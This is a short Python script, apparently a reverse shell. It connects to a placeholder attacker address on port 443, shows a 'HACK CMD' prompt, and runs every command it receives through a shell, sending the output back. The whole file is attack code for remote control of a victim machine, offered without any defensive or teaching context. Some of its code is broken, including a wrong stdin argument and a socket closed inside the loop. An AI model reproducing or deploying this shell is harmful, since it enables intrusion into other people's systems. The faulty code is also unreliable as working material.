#!/usr/bin/python3

import socket
import subprocess
from sys import stdout

HOST = 'Your IP'
PORT = 443 # you can put any port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
s.send(b'\nHACK CMD:>> ')

while True:
    data = s.recv(4096)
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess)
    stdout_value = b'\n' + b'CMD EXECUTED: ' + proc.stdout.read() + proc.stderr.read() + b'\n'
    s.send(stdout_value)
    s.send(b'HACK CMD:>> ')
    s.close()
